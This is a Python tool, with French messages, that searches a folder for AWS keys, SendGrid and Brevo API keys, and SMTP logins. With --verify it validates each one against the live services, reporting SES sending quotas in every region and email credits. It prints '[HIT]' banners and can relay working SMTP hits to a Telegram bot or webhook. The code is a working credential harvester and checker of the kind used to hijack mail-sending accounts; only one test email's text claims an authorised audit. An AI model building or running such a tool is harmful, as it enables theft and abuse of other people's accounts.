#!/usr/bin/env python3
from __future__ import annotations

import argparse
import hashlib
import json
import os
import re
import smtplib
import ssl
import sys
import urllib.error
import urllib.request
from dataclasses import dataclass, field
from email.message import EmailMessage
from pathlib import Path
from typing import Any, Iterable
from urllib.parse import urlencode

TEXT_EXTENSIONS = {
    ".txt",
    ".env",
    ".ini",
    ".cfg",
    ".conf",
    ".log",
    ".yaml",
    ".yml",
    ".json",
    ".properties",
    ".md",
    ".csv",
    ".xml",
    ".html",
    ".htm",
    ".sh",
    ".py",
    ".js",
    ".ts",
    ".sql",
}

MAX_FILE_BYTES = 2 * 1024 * 1024

RE_AWS_ACCESS_KEY = re.compile(
    r"\b((?:AKIA|ASIA)[0-9A-Z]{16})\b",
    re.MULTILINE,
)
RE_AWS_SECRET = re.compile(
    r"\b([A-Za-z0-9/+=]{40})\b",
    re.MULTILINE,
)

RE_SENDGRID = re.compile(
    r"\b(SG\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,})\b",
    re.MULTILINE,
)

RE_BREVO = re.compile(
    r"\b(xkeysib-[a-f0-9]{64}-[A-Za-z0-9]{16})\b",
    re.IGNORECASE | re.MULTILINE,
)

RE_SMTP_URL = re.compile(
    r"smtp(?:s)?://([^:/@]+):([^@]+)@([^:/]+)(?::(\d+))?",
    re.IGNORECASE,
)


@dataclass
class AwsPair:
    access_key: str
    secret_key: str
    source_file: str
    line_hint: int = 0


@dataclass
class HitSummary:
    kind: str
    masked: str
    source_file: str
    details: dict[str, Any] = field(default_factory=dict)


def _mask_secret(s: str, keep_start: int = 4, keep_end: int = 4) -> str:
    if len(s) <= keep_start + keep_end + 3:
        return "***"
    return f"{s[:keep_start]}...{s[-keep_end:]}"


def _dedupe_key(parts: Iterable[str]) -> str:
    h = hashlib.sha256("|".join(parts).encode()).hexdigest()[:32]
    return h


def pick_folder_gui() -> Path | None:
    try:
        import tkinter as tk
        from tkinter import filedialog
    except ImportError:
        print("tkinter indisponible : utilisez --folder /chemin", file=sys.stderr)
        return None
    root = tk.Tk()
    root.withdraw()
    root.attributes("-topmost", True)
    path = filedialog.askdirectory(title="Choisir le dossier à analyser")
    root.destroy()
    if not path:
        return None
    return Path(path)


def iter_text_files(root: Path) -> Iterable[Path]:
    for p in root.rglob("*"):
        if not p.is_file():
            continue
        if p.stat().st_size > MAX_FILE_BYTES:
            continue
        if p.suffix.lower() in TEXT_EXTENSIONS or p.name in (".env", "credentials", "config"):
            yield p


def extract_aws_pairs(content: str, file_path: Path) -> list[AwsPair]:
    lines = content.splitlines()
    access_positions: list[tuple[int, str]] = []
    for i, line in enumerate(lines):
        for m in RE_AWS_ACCESS_KEY.finditer(line):
            access_positions.append((i, m.group(1)))
    if not access_positions:
        return []
    pairs: list[AwsPair] = []
    for line_no, ak in access_positions:
        window_start = max(0, line_no - 5)
        window_end = min(len(lines), line_no + 6)
        window = "\n".join(lines[window_start:window_end])
        for sm in RE_AWS_SECRET.finditer(window):
            sk = sm.group(1)
            if sk == ak:
                continue
            pairs.append(AwsPair(ak, sk, str(file_path), line_no + 1))
    seen: set[str] = set()
    out: list[AwsPair] = []
    for p in pairs:
        k = _dedupe_key([p.access_key, p.secret_key])
        if k not in seen:
            seen.add(k)
            out.append(p)
    return out


def extract_sendgrid_keys(content: str, file_path: Path) -> list[tuple[str, str]]:
    found: list[tuple[str, str]] = []
    seen: set[str] = set()
    for m in RE_SENDGRID.finditer(content):
        key = m.group(1)
        h = _dedupe_key([key])
        if h in seen:
            continue
        seen.add(h)
        found.append((key, str(file_path)))
    return found


def extract_brevo_keys(content: str, file_path: Path) -> list[tuple[str, str]]:
    found: list[tuple[str, str]] = []
    seen: set[str] = set()
    for m in RE_BREVO.finditer(content):
        key = m.group(1)
        h = _dedupe_key([key])
        if h in seen:
            continue
        seen.add(h)
        found.append((key, str(file_path)))
    return found


def extract_smtp_from_content(content: str, file_path: Path) -> list[dict[str, Any]]:
    out: list[dict[str, Any]] = []
    seen: set[str] = set()
    filtered = "\n".join(
        ln for ln in content.splitlines() if not ln.lstrip().startswith("#")
    )
    for m in RE_SMTP_URL.finditer(filtered):
        user, password, host, port_s = m.group(1), m.group(2), m.group(3), m.group(4)
        port = int(port_s) if port_s else 587
        entry = {
            "host": host,
            "port": port,
            "user": user,
            "password": password,
            "tls": port == 587 or "smtp" in m.group(0).lower(),
            "file": str(file_path),
        }
        h = _dedupe_key([host, str(port), user, password])
        if h not in seen:
            seen.add(h)
            out.append(entry)
    return out


def http_json(
    url: str,
    method: str = "GET",
    headers: dict[str, str] | None = None,
    data: bytes | None = None,
    timeout: float = 20.0,
) -> tuple[int, Any]:
    req = urllib.request.Request(url, data=data, method=method)
    for k, v in (headers or {}).items():
        req.add_header(k, v)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read().decode("utf-8", errors="replace")
            ct = resp.headers.get("Content-Type", "")
            if "json" in ct or body.strip().startswith("{"):
                return resp.status, json.loads(body) if body.strip() else {}
            return resp.status, body
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", errors="replace") if e.fp else ""
        try:
            parsed = json.loads(raw) if raw.strip().startswith("{") else raw
        except json.JSONDecodeError:
            parsed = raw
        return e.code, parsed


def send_telegram_hit(message: str, parse_mode: str | None = None) -> bool:
    token = os.environ.get("TELEGRAM_BOT_TOKEN")
    chat_id = os.environ.get("TELEGRAM_CHAT_ID")
    webhook = os.environ.get("TELEGRAM_WEBHOOK_URL")
    if webhook:
        payload = json.dumps({"text": message}).encode("utf-8")
        req = urllib.request.Request(
            webhook,
            data=payload,
            method="POST",
            headers={"Content-Type": "application/json"},
        )
        try:
            with urllib.request.urlopen(req, timeout=15) as resp:
                return 200 <= resp.status < 300
        except urllib.error.URLError:
            return False
    if token and chat_id:
        q = urlencode(
            {
                "chat_id": chat_id,
                "text": message,
                **({"parse_mode": parse_mode} if parse_mode else {}),
            }
        )
        url = f"https://api.telegram.org/bot{token}/sendMessage?{q}"
        try:
            with urllib.request.urlopen(url, timeout=15) as resp:
                return 200 <= resp.status < 300
        except urllib.error.URLError:
            return False
    return False


def format_hit_banner(kind: str, status: str, masked: str, extra: str = "") -> str:
    line = f"[HIT] [{kind}] - {status}\nCredential: {masked}"
    if extra:
        line += f"\n{extra}"
    return line


def verify_sendgrid(api_key: str) -> tuple[bool, str]:
    code, data = http_json(
        "https://api.sendgrid.com/v3/user/credits",
        headers={"Authorization": f"Bearer {api_key}"},
    )
    if code == 200 and isinstance(data, dict):
        remain = data.get("remain")
        total = data.get("total")
        over = data.get("overage")
        return True, f"quota: remain={remain} total={total} overage={over}"
    return False, f"HTTP {code}: {data!s}"[:500]


def verify_brevo(api_key: str) -> tuple[bool, str]:
    code, data = http_json(
        "https://api.brevo.com/v3/account",
        headers={"api-key": api_key, "accept": "application/json"},
    )
    if code == 200 and isinstance(data, dict):
        email = data.get("email")
        plan = data.get("plan")
        credits = data.get("credits")
        return True, f"compte: email={email} plan={plan} credits={credits}"
    return False, f"HTTP {code}: {data!s}"[:500]


def verify_aws_pair(pair: AwsPair) -> tuple[bool, str, list[tuple[str, str]]]:
    try:
        import boto3
        from botocore.exceptions import ClientError
    except ImportError:
        return False, "boto3 non installé (pip install boto3)", []

    session = boto3.Session(
        aws_access_key_id=pair.access_key,
        aws_secret_access_key=pair.secret_key,
    )
    try:
        sts = session.client("sts")
        ident = sts.get_caller_identity()
        arn = ident.get("Arn", "")
        aid = ident.get("Account", "")
    except ClientError as e:
        return False, str(e), []

    regions = session.get_available_regions("ses")
    per_region: list[tuple[str, str]] = []
    for region in regions:
        try:
            ses = session.client("ses", region_name=region)
            q = ses.get_send_quota()
            max_24 = q.get("Max24HourSend")
            sent = q.get("SentLast24Hours")
            per_region.append(
                (region, f"Max24h={max_24} sent24h={sent}"),
            )
        except ClientError:
            continue
        except Exception:
            continue

    detail = f"ARN={arn} Account={aid} | SES vérifié sur {len(per_region)} région(s)"
    return True, detail, per_region


def verify_smtp(
    host: str,
    port: int,
    user: str,
    password: str,
    use_tls: bool,
    test_recipient: str | None,
) -> tuple[bool, str]:
    context = ssl.create_default_context()
    try:
        if port == 465:
            server = smtplib.SMTP_SSL(host, port, context=context, timeout=25)
        else:
            server = smtplib.SMTP(host, port, timeout=25)
            server.ehlo()
            if use_tls:
                server.starttls(context=context)
                server.ehlo()
        server.login(user, password)
        if test_recipient:
            msg = EmailMessage()
            msg["Subject"] = "Credential scanner test"
            msg["From"] = user if "@" in user else f"noreply@{host}"
            msg["To"] = test_recipient
            msg.set_content("Test SMTP depuis credential_folder_scanner (audit autorisé).")
            server.send_message(msg)
        server.quit()
        return True, "login OK" + (" + envoi test" if test_recipient else "")
    except Exception as e:
        return False, str(e)


def scan_folder(root: Path) -> dict[str, Any]:
    aws_pairs: list[AwsPair] = []
    sendgrid: list[tuple[str, str]] = []
    brevo: list[tuple[str, str]] = []
    smtp: list[dict[str, Any]] = []

    for fp in iter_text_files(root):
        try:
            text = fp.read_text(encoding="utf-8", errors="replace")
        except OSError:
            continue
        aws_pairs.extend(extract_aws_pairs(text, fp))
        sendgrid.extend(extract_sendgrid_keys(text, fp))
        brevo.extend(extract_brevo_keys(text, fp))
        smtp.extend(extract_smtp_from_content(text, fp))

    return {
        "aws": aws_pairs,
        "sendgrid": sendgrid,
        "brevo": brevo,
        "smtp": smtp,
    }


def run_verify(
    bundle: dict[str, Any],
    smtp_test_to: str | None,
    telegram_on_smtp: bool,
) -> list[HitSummary]:
    hits: list[HitSummary] = []

    for pair in bundle["aws"]:
        masked = f"{pair.access_key} / {_mask_secret(pair.secret_key)}"
        ok, msg, regions = verify_aws_pair(pair)
        extra_lines = [msg]
        for r, q in regions[:15]:
            extra_lines.append(f"  {r}: {q}")
        if len(regions) > 15:
            extra_lines.append(f"  ... +{len(regions) - 15} region(s)")
        extra = "\n".join(extra_lines)
        status = "FONCTIONNEL" if ok else "ÉCHEC"
        print(format_hit_banner("AWS", status, masked, extra))
        hits.append(
            HitSummary(
                "AWS",
                masked,
                pair.source_file,
                {"ok": ok, "message": msg, "regions": regions},
            ),
        )

    for key, src in bundle["sendgrid"]:
        masked = _mask_secret(key, 6, 6)
        ok, detail = verify_sendgrid(key)
        status = "FONCTIONNEL" if ok else "ÉCHEC"
        print(format_hit_banner("SendGrid", status, masked, detail))
        hits.append(HitSummary("SendGrid", masked, src, {"ok": ok, "detail": detail}))

    for key, src in bundle["brevo"]:
        masked = _mask_secret(key, 8, 8)
        ok, detail = verify_brevo(key)
        status = "FONCTIONNEL" if ok else "ÉCHEC"
        print(format_hit_banner("Brevo", status, masked, detail))
        hits.append(HitSummary("Brevo", masked, src, {"ok": ok, "detail": detail}))

    for s in bundle["smtp"]:
        masked = f"{s['user']} @ {s['host']}:{s['port']}"
        use_tls = s["port"] in (587, 2525)
        ok, detail = verify_smtp(
            s["host"],
            s["port"],
            s["user"],
            s["password"],
            use_tls,
            smtp_test_to,
        )
        status = "FONCTIONNEL" if ok else "ÉCHEC"
        banner = format_hit_banner("SMTP", status, masked, f"{s['file']}\n{detail}")
        print(banner)
        hits.append(HitSummary("SMTP", masked, s["file"], {"ok": ok, "detail": detail}))
        if ok and telegram_on_smtp:
            send_telegram_hit(banner)

    return hits


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--folder", type=Path)
    parser.add_argument("--verify", action="store_true")
    parser.add_argument("--smtp-test-to", type=str, default=None)
    parser.add_argument("--telegram-smtp-hit", action="store_true")
    args = parser.parse_args()

    root = args.folder
    if root is None:
        root = pick_folder_gui()
    if root is None or not root.is_dir():
        print("Dossier invalide ou non choisi.", file=sys.stderr)
        return 2

    print(f"Scan de : {root.resolve()}")
    bundle = scan_folder(root)
    print(
        json.dumps(
            {
                "aws_pairs": len(bundle["aws"]),
                "sendgrid": len(bundle["sendgrid"]),
                "brevo": len(bundle["brevo"]),
                "smtp": len(bundle["smtp"]),
            },
            indent=2,
        ),
    )

    if args.verify:
        run_verify(bundle, args.smtp_test_to, args.telegram_smtp_hit)

    return 0


if __name__ == "__main__":
    sys.exit(main())
